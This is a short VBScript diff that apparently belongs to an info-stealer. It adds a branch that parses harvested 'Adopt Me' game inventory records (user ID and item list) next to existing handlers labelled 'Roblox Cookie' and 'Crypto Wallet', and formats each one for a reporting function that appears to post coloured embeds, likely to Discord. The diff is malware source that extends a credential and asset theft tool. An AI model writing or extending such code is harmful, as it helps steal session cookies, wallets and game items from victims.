@@ -73,6 +73,25 @@ For i=0 To UBound(lines)
     P "Roblox Cookie",Mid(lines(i),8),65280,b:cnt=cnt+1
   ElseIf Left(lines(i),7)="WALLET|" Then
     P "Crypto Wallet",Mid(lines(i),8),16753920,b:cnt=cnt+1
+  ElseIf Left(lines(i),7)="ADOPTME" Or Left(lines(i),8)="ADOPTME|" Then
+    Dim ad:ad=Split(Mid(lines(i),8),"|")
+    If UBound(ad)>=1 Then
+      Dim alist:alist="UserID: "&ad(0)&Chr(10)
+      If UBound(ad)>=2 Then
+        Dim items:items=Split(ad(1),";")
+        Dim k,itm
+        For k=0 To UBound(items)
+          If Len(items(k))>3 Then
+            itm=Split(items(k),",")
+            If UBound(itm)>=0 Then alist=alist&"- "&itm(0)
+            If UBound(itm)>=2 Then alist=alist&" x"&itm(2)
+            alist=alist&Chr(10)
+          End If
+          If k>=20 Then alist=alist&"...+"&(UBound(items)-20)&" more":Exit For
+        Next
+      End If
+      P "Adopt Me Inventory",alist,16750848,b:cnt=cnt+1
+    End If
   End If
 Next
 
